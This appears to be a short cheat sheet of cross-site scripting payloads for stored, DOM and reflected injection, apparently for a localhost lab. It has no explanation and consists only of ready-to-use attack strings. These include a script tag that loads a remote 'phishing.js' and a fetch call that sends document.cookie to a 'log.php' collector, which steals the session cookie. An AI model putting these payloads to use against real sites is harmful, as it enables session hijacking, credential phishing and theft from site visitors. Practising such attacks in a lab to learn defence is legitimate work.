- STORED script
1. <span style="color:red">This is a test of XSS</span>
2. <h1><span style="color:red">This is a test of XSS</span></h1>

- DOM script
1. <script src="http://localhost/XSS/DOM/phishing.js"> </script>


- REFLECTED script
1. <script> alert(document.cookie) </script>
2. <script>fetch('http://localhost/XSS/REFLECTED/log.php?c=' + document.cookie)</script>
3. 
